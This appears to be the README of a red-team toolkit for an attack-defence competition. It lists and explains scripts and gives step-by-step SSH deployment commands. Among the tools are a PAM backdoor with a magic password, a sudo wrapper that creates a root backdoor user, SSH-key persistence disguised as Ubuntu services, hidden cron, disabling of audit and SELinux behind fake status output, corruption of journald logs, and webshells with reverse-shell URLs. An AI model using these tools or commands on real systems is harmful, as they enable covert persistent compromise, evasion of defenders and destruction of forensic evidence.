# Tooling descriptions

## Map
```
├── rt-ssh.sh                          ← SSH deployment wrapper (start here)
├── alias-bashrc.sh
├── break-net-tools.sh
├── compromise-w-who.sh
├── evil-timer
│   ├── deploy-evil-timer.sh
│   ├── poison-timer.sh
│   ├── python2-certbot.service
│   └── python2-certbot.timer
├── flood-journal.sh
├── infinite-users.sh
├── lock-busybox.sh
├── no-apt.sh
├── no-audit.sh
├── no-selinux.sh
├── path-hijack.sh
├── persist
│   ├── ad_persist.sh
│   ├── linux_persist.sh
│   ├── redis_persist.sh
│   └── windows_persist.ps1
├── pam-backdoor
│   └── deploy-pam-backdoor.sh         ← self-contained (C source embedded)
├── pihole-github-sinkhole.sh
├── README.md
├── reconboard-v5
│   └── ...
├── shadow-crond.sh
├── sinkhole-scripts.sh
├── sudo-biNOry.sh
├── the-toucher.sh
├── ureadahead-persist.sh
├── vandalize-bashrc.sh
├── vim-persist.sh
├── webshells
│   ├── deploy_lamp_shell.sh
│   ├── deploy_nginx_flask_shell.sh
│   └── shell.php
└── yay-install.sh
```

## Desc
| tool name | functionality |
| --- | --- |
| alias-bashrc.sh | searches for .bashrc files and injects a sudo() shell function that silently flushes nftables every time sudo is run, whether the user confirms or cancels — skips greyteam/ansible/scoring users |
| break-net-tools.sh | breaks curl, wget, and git via binary shadowing + proxy poisoning + shell function injection, all reversible, local git ops still work so scoring doesnt break — usage: `install\|remove\|status` |
| compromise-w-who.sh | backs up the `w` and `who` binaries then overwrites them with fakes, `w` shows hardcoded fake session data, `who` just says "better question is, where?" |
| evil-timer | poison-timer.sh is the real one — takes `--key "ssh-ed25519 ..."` to bake SSH key re-injection into the payload alongside firewall flush, SUID bash drop, and watchdog restarts; state saved to /var/cache/.syspkg/poison-timer.state so `remove` always targets exactly what was installed rather than re-guessing; all artefacts backdated 2020-04-15; deploy-evil-timer.sh deploys the python2-certbot user-level timer (no root) — usage: `install [--target <timer>] [--interval <min>] [--key "..."] \| remove \| status \| list` |
| flood-journal.sh | poisons journald.conf, corrupts existing .journal files with urandom garbage so historical logs are unreadable, shadows journalctl to report no entries and 0 disk usage, floods with 8 parallel workers via /dev/log, installs a drop-in on systemd-journald itself so workers relaunch whenever journald restarts — watchdog delegated to shadow-crond hidden spool (no visible cron entry anywhere); `status` checks the spool directly rather than crontab — usage: `install\|remove\|status` |
| infinite-users.sh | symlinks nologin to bash so any service account can get a shell, also writes a sudoers.d entry giving all those accounts full nopasswd root |
| lock-busybox.sh | replaces all busybox binaries with a gated wrapper — no token = segfault, red team uses RT_TOK=rt2025!delta or the hidden binary at /var/cache/.syspkg/busybox.real directly, also chmod 700s the shadow-crond copy so blue team cant call it — **must run AFTER shadow-crond.sh**; install now warns if shadow-crond (systemd-timesyncd-helper) isn't running before proceeding — usage: `install\|remove\|status` |
| no-apt.sh | renames sources.list and sources.list.d so apt-get silently breaks — idempotent, skips if already deployed — usage: `install\|remove\|status` |
| no-audit.sh | flushes all audit rules and disables kernel auditing with the real auditctl, then shadows it with a no-op wrapper so blue team cant add rules back, also redirects auditd log output to /dev/null and truncates rules.d — auditd stays "active (running)" the whole time — idempotent, skips if backup exists; `remove` restores auditctl, auditd.conf, and rules.d from /var/cache/.syspkg/ — usage: `install\|remove\|status` |
| no-selinux.sh | immediately sets permissive with the real setenforce, persists SELINUX=permissive in config, then shadows setenforce (no-op), getenforce (always says Enforcing), sestatus (full fake enforcing output), and semodule (no-op) — blue team sees enforcing but nothing is actually being enforced — idempotent, skips if backup exists; `remove` restores all four binaries and runs the real setenforce 1; `status` reads real enforcement via backup binary so it tells the truth — usage: `install\|remove\|status` |
| pam-backdoor | compiles pam_audit_log.so (looks like a legit audit stub) and prepends `auth sufficient` to /etc/pam.d/common-auth, lets you auth as any user with the magic password without touching real credentials; self-contained (C source embedded as heredoc, no companion .c needed); PAM dir detected via `find` on pam_unix.so (no python3 dependency); preflight checks gcc and libpam0g-dev headers; .so timestamped to match existing PAM modules; idempotent — usage: `install\|remove\|status` |
| pihole-github-sinkhole.sh | installs pihole unattended and sinkholes all github domains (github.com, githubusercontent.com, ghcr.io, etc) to 0.0.0.0, also poisons /etc/hosts as a backup layer |
| shadow-crond.sh | copies busybox to a hidden path so ps shows a system-looking name, runs busybox crond with a custom spool dir invisible to crontab -l, hides behind a systemd-timesyncd-helper service, hidden spool also watches flood-journal service every 5 min — edit /var/cache/.syspkg/tabs/root to change payload — **must run BEFORE lock-busybox.sh**; install now detects if the found busybox is the lock-busybox gated wrapper and automatically falls back to /var/cache/.syspkg/busybox.real — usage: `install\|remove\|status` |
| sinkhole-scripts.sh | sets up a dnsmasq sinkhole for any domain, defaults to pointing github.com at a dead ip, has install/remove/test |
| sudo-biNOry.sh | replaces /usr/bin/sudo with a wrapper that silently creates a backdoor user `sudoer` with full nopasswd root on first invocation, then passes through normally |
| the-toucher.sh | wanders the filesystem randomly and touches files to corrupt timestamps, messes with log rotation and anything that uses mtime |
| vandalize-bashrc.sh | searches the machine for .bashrc files and adds a big `:3` to them |
| vim-persist.sh | injects a vimscript autocmd into all .vimrc files that flushes iptables and nftables silently on every vim open, also hits /etc/vim/vimrc.local for system-wide coverage on users without a .vimrc — skips greyteam/ansible/scoring users, /etc/vim/vimrc.local respects the same whitelist |
| yay-install.sh | installs yay, probably doesnt work on ubuntu but whatever |
| ureadahead-persist.sh | persistence disguised as the `ureadahead` boot-prefetch service (real Ubuntu package in 14.04–20.04, removed in 22.04/24.04 — looks like an upgrade leftover), installs `/sbin/ureadahead` wrapper + hidden payload at `/lib/ureadahead/pack`, fires at boot + every 15 min via ExecStartPost loop, payload: SSH key injection into all homedirs, firewall flush, watchdog restart of shadow-crond + flood-journal — all artefacts backdated to 2020-04-15 — usage: `install [--key "..."] \| remove \| status` |
| path-hijack.sh | PATH directory injection — drops transparent command wrappers into a dir that lands first in `$PATH`; every time a user runs a hijacked command the wrapper re-asserts persistence silently then execs the real binary; three levels: **user** (`~/.local/bin` — already auto-prepended by Ubuntu 24.04's `~/.profile`, zero PATH modification, no root needed), **system** (`/etc/profile.d/10-update-manager.sh` drop-in for all users, disguised as real Ubuntu package), **cron** (prepends to `/etc/crontab` PATH to catch root cron jobs calling commands without full paths); payload levels 1–3: ssh-key / +suid-bash / +fw-flush+watchdogs — usage: `scan \| install [--level user\|system\|cron] [--key "..."] [--payload 1\|2\|3] \| remove \| status` |
| rt-ssh.sh | SSH deployment wrapper — base64-encodes each tool on Kali, SSHs to target, decodes into `/dev/shm` (RAM tmpfs, never touches disk), executes, wipes; no source code left on target machines; supports root SSH, sudo with/without password, and user-level (no sudo) modes — see Deployment section below |

### Deployment notes

- **shadow-crond.sh must run before lock-busybox.sh** — both scripts now enforce this in code: shadow-crond detects the lock-busybox wrapper (grep for RT_TOK) and falls back to `/var/cache/.syspkg/busybox.real`; lock-busybox warns at install time if shadow-crond isn't running; if you get the order wrong, the fix is `lock-busybox.sh remove → shadow-crond.sh install → lock-busybox.sh install`
- **flood-journal.sh watchdog** — does not install any cron entry; shadow-crond's hidden spool at `/var/cache/.syspkg/tabs/root` watches `network-health-monitor` every 5 min; `flood-journal.sh status` now verifies the spool directly instead of checking crontab
- **poison-timer.sh apt-daily caveat** — apt-daily.timer is last in the auto-select list; if no-apt.sh ran first, apt-daily's ExecStart may fail and block ExecStartPost; man-db/logrotate/fstrim are preferred — this is enforced by candidate ordering in the script
- **idempotent scripts** — no-apt.sh, no-audit.sh, no-selinux.sh all exit early if already deployed; no-audit.sh and no-selinux.sh now also have `remove` and `status` subcommands matching the rest of the toolkit
- **shared hidden dir** — all scripts use `/var/cache/.syspkg/` for backups and binaries (chmod 700); poison-timer state is at `/var/cache/.syspkg/poison-timer.state`
- **pam-backdoor is now self-contained** — C source embedded as heredoc; PAM dir detected via `find` on pam_unix.so (no python3 dependency); gcc and libpam0g-dev headers checked before attempting compile

---

## Deployment

All tools are deployed from Kali over SSH using `rt-ssh.sh`. Scripts are base64-encoded on Kali, piped to the target, decoded into `/dev/shm` (RAM — never written to actual disk), executed, and wiped. Source code never touches the target filesystem.

### Prerequisites

```bash
# on Kali — generate your deployment key if you don't have one
ssh-keygen -t ed25519 -f ~/.ssh/rt_ed25519 -N "" -C "rt-persist"
export RT_KEY="$(cat ~/.ssh/rt_ed25519.pub)"   # paste this into --key args below

# make everything executable
chmod +x rt-ssh.sh *.sh evil-timer/*.sh pam-backdoor/*.sh persist/*.sh webshells/*.sh
```

### rt-ssh.sh flags

```
./rt-ssh.sh [OPTIONS] <tool> [tool-args...]

  -t, --target USER@HOST   SSH target (required for remote tools)
  -i, --identity FILE      SSH private key file
  -P, --port PORT          SSH port (default: 22)
  -S, --sudo-pass PASS     Sudo password when SSH user is not root
      --no-sudo            Don't prepend sudo (already SSH'd in as root)
  -v, --verbose            Print the remote command before running
      --list               List all available tools and exit
```

### Recommended deployment order (per host)

Run these roughly in order. Steps marked **(root)** require root SSH or `-S <sudo_pass>`.

```bash
TARGET="root@<host_ip>"   # adjust per target

# 1. audit first — see what PATH hijack opportunities exist
./rt-ssh.sh -t $TARGET path-hijack scan

# 2. persistence layer 1 — shadow cron (must be BEFORE lock-busybox)
./rt-ssh.sh -t $TARGET shadow-crond install

# 3. persistence layer 2 — ureadahead disguise (SSH key + fw flush + watchdogs)
./rt-ssh.sh -t $TARGET ureadahead-persist install --key "$RT_KEY"

# 4. persistence layer 3 — PATH hijacking (user-level, no sudo needed)
./rt-ssh.sh -t ubuntu@<host_ip> path-hijack-user install --level user --key "$RT_KEY"

# 5. persistence layer 4 — PATH hijacking (system-wide + cron, root)
./rt-ssh.sh -t $TARGET path-hijack install --level system --key "$RT_KEY"
./rt-ssh.sh -t $TARGET path-hijack install --level cron   --key "$RT_KEY" --commands "python3,bash,curl"

# 6. PAM backdoor — auth as any user with magic password
./rt-ssh.sh -t $TARGET pam-backdoor install

# 7. lock busybox AFTER shadow-crond (ordering constraint)
./rt-ssh.sh -t $TARGET lock-busybox install

# 8. anti-forensics
./rt-ssh.sh -t $TARGET no-audit install
./rt-ssh.sh -t $TARGET no-selinux install

# 9. firewall persistence timer (--key bakes SSH re-injection into the timer payload)
./rt-ssh.sh -t $TARGET poison-timer install --key "$RT_KEY"

# 10. break blue team tooling
./rt-ssh.sh -t $TARGET no-apt install
./rt-ssh.sh -t $TARGET break-net-tools install
./rt-ssh.sh -t $TARGET pihole-sinkhole install    # blocks GitHub/CDN
```

### Non-root SSH (sudo required)

```bash
# with NOPASSWD sudo
./rt-ssh.sh -t ubuntu@<host_ip> shadow-crond install

# with password sudo
./rt-ssh.sh -t ubuntu@<host_ip> -S 'ubuntu' shadow-crond install
```

### User-level tools (no sudo, run as SSH user)

These two run without sudo — systemd user units and ~/.local/bin PATH injection:

```bash
./rt-ssh.sh -t ubuntu@<host_ip> evil-timer install
./rt-ssh.sh -t ubuntu@<host_ip> path-hijack-user install --level user --key "$RT_KEY"
```

### Local tools (run on Kali, target the host via SSH/HTTP/Redis)

These scripts manage the target directly without the `rt-ssh.sh` pipe — they handle their own connections:

```bash
# Linux host — SSH key + cron + systemd user service + SUID bash + .bashrc
./persist/linux_persist.sh <target_ip> <user> <pass> <lhost> <lport>

# Redis host — unauthenticated Redis → SSH key + cron.d write
./persist/redis_persist.sh <target_ip>

# AD (post-DA) — golden ticket + backdoor DA + AdminSDHolder + DNS
./persist/ad_persist.sh <dc_ip> <domain.local> Administrator <pass> <lhost>

# Windows — scheduled task + reg Run + WMI event sub + VBS startup + hidden service
#   powershell -ep bypass -File persist/windows_persist.ps1 -LHost <lhost> -LPort 4446

# Webshells
./webshells/deploy_lamp_shell.sh  <target_ip> guest ""
./webshells/deploy_nginx_flask_shell.sh <target_ip> 80 6379 <lhost>
```

### Check status across tools

```bash
TARGET="root@<host_ip>"
for tool in shadow-crond flood-journal ureadahead-persist lock-busybox poison-timer pam-backdoor no-audit no-selinux path-hijack; do
    echo "=== $tool ==="
    ./rt-ssh.sh -t $TARGET $tool status 2>/dev/null || true
done
```

### Secrets

| Secret | Default | Used by |
|--------|---------|---------|
| RT token | `rt2025!delta` | busybox gate, PAM backdoor, PHP webshell |
| SSH key | generate per op | ureadahead-persist, poison-timer, path-hijack, linux_persist |

**Change both before deployment** — especially if competing teams can read each other's tooling.

```bash
# find every hardcoded token and replace before deployment
grep -r "rt2025!delta" odessa/ --include="*.sh" --include="*.php" --include="*.c" -l
```

## TODO
- Multiple ssh binaries running on different ports
- 20 Docker binaries all running as hidden services

---

## persist/ — Deep Persistence Scripts

| Script | Targets | Methods |
|--------|---------|---------|
| `persist/linux_persist.sh` | svc-ftp-01, svc-redis-01, svc-database-01, svc-amazin-01, svc-samba-01 | SSH authorized_keys, cron, systemd service, SUID bash copy, .bashrc hook |
| `persist/redis_persist.sh` | svc-redis-01, svc-database-01 | Redis RDB write → SSH key injection + /etc/cron.d write |
| `persist/windows_persist.ps1` | svc-ad-01, svc-smb-01 | Scheduled task (SYSTEM), reg Run key, WMI event sub, startup folder VBS, hidden service |
| `persist/ad_persist.sh` | svc-ad-01 | DCSync, golden ticket, backdoor Domain Admin, AdminSDHolder ACL, DNS record injection |

```bash
# Linux (any Ubuntu host)
./persist/linux_persist.sh <target_ip> <user> <pass> <lhost> <lport>

# Redis (unauthenticated open Redis)
./persist/redis_persist.sh <target_ip>

# AD (after getting DA creds)
./persist/ad_persist.sh <dc_ip> <domain.local> Administrator <pass> <lhost>

# Windows (run on a PS shell on target, or via CrackMapExec -X)
#   powershell -ep bypass -File persist/windows_persist.ps1 -LHost <lhost> -LPort 4446
```

## webshells/ — Webshell Deployers

| Script | Target | Technique |
|--------|--------|-----------|
| `webshells/shell.php` | WP/LAMP hosts | Feature-rich PHP webshell (cmd / upload / read / revshell) |
| `webshells/deploy_lamp_shell.sh` | svc-samba-01 (LAMP) | Samba→webroot write, LFI+log poisoning, PHPMyAdmin SELECT INTO OUTFILE |
| `webshells/deploy_nginx_flask_shell.sh` | svc-redis-01 (Flask/Nginx) | Jinja2 SSTI→RCE, Redis session forgery, Nginx alias traversal, Werkzeug debug console |

```bash
chmod +x webshells/*.sh persist/*.sh

# LAMP
./webshells/deploy_lamp_shell.sh <target_ip> guest ""

# Flask/Nginx
./webshells/deploy_nginx_flask_shell.sh <target_ip> 80 6379 <lhost>
```

### shell.php quick ref (password: `rt2025!delta` — change before use)

| Action | URL |
|--------|-----|
| Command | `?p=rt2025!delta&c=id` |
| Read file | `?p=rt2025!delta&act=read&f=/etc/passwd` |
| Upload | `POST ?p=rt2025!delta&act=upload` |
| Rev shell | `?p=rt2025!delta&act=revshell&rh=LHOST&rp=4444` |
